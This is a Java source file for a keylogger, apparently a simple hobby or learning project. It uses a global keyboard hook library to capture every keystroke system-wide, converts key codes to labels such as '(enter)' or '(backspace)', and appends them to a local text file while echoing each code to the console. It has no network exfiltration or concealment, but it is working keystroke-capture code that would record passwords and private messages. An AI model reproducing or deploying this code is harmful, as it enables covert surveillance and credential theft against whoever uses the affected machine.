import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

import de.ksquared.system.keyboard.GlobalKeyListener;
import de.ksquared.system.keyboard.KeyAdapter;
import de.ksquared.system.keyboard.KeyEvent;

public class keylog {

	static console cs = new console();

	

	public static void main(String[] args) {
		cs.start();

		new GlobalKeyListener().addKeyListener(new KeyAdapter() {
			@Override
			public void keyPressed(KeyEvent event) {
				String temp2;
				char temp;

				switch (event.getVirtualKeyCode()) {
				case 8: // backspace
					temp2 = "(backspace)";
					break;
				case 9: // tab
					temp2 = "(tab)";
					break;
				case 13: // enter
					temp2 = "(enter)";
					break;
				case 16: // shift
					temp2 = "(shfit)";
					break;
				case 17: // ctrl
					temp2 = "(ctrl)";
					break;
				case 18: // alt
					temp2 = "(alt)";
					break;
				case 19: // pause break
					temp2 = "(pause break)";
					break;
				case 20: // caps lock
					temp2 = "(caps lock)";
					break;
				case 21: // 한/영
					temp2 = "(한/영)";
					break;
				case 25: // 한자
					temp2 = "(한자)";
					break;
				case 27: // esc
					temp2 = "(esc)";
					break;
				case 32: // space
					temp2 = "(space)";
					break;
				case 33: // pageup
					temp2 = "(pageup)";
					break;
				case 34: // pagedown
					temp2 = "(pagedown)";
					break;
				case 35: // end
					temp2 = "(end)";
					break;
				case 36: // home
					temp2 = "(home)";
					break;
				case 37: // ←(중간)
					temp2 = "(←(중간))";
					break;
				case 38: // ↑(중간)
					temp2 = "(↑(중간))";
					break;
				case 39: // →(중간)
					temp2 = "(→(중간))";
					break;
				case 40: // ↓(중간)
					temp2 = "(↓(중간))";
					break;
				case 45: // insert
					temp2 = "(insert)";
					break;
				case 46: // delete
					temp2 = "(delete)";
					break;
				case 144: // num lock
					temp2 = "(num lock)";
					break;
				case 145: // scroll lock
					temp2 = "(scroll lock)";
					break;
				case 48: // 0
					temp2 = "(0)";
					break;
				case 49: // 1
					temp2 = "(1)";
					break;
				case 50: // 2
					temp2 = "(2)";
					break;
				case 51: // 3
					temp2 = "(3)";
					break;
				case 52: // 4
					temp2 = "(4)";
					break;
				case 53: // 5
					temp2 = "(5)";
					break;
				case 54: // 6
					temp2 = "(6)";
					break;
				case 55: // 7
					temp2 = "(7)";
					break;
				case 56: // 8
					temp2 = "(8)";
					break;
				case 57: // 9
					temp2 = "(9)";
					break;
				case 190: // .
					temp2 = "(.)";
					break;
				default:
					temp = (char) event.getVirtualKeyCode();
					temp2 = String.valueOf(temp);
					break;
				}

				File file = new File("C:\\Users\\LG\\keylog\\test.txt");
				FileWriter fw;
				BufferedWriter bw = null;
				try {
					fw = new FileWriter(file, true);
					bw = new BufferedWriter(fw);
					bw.write(temp2);
				} catch (IOException e) {
					e.printStackTrace();
				} finally {
					try {
						bw.close();
					} catch (IOException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
				System.out.println("입력받은 키 코드:"+event.getVirtualKeyCode());
			}
			// @Override
			// public void keyReleased(KeyEvent event)
			// {System.out.println(event); }
		});
		while (true)
			try {
				Thread.sleep(100);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
	}
}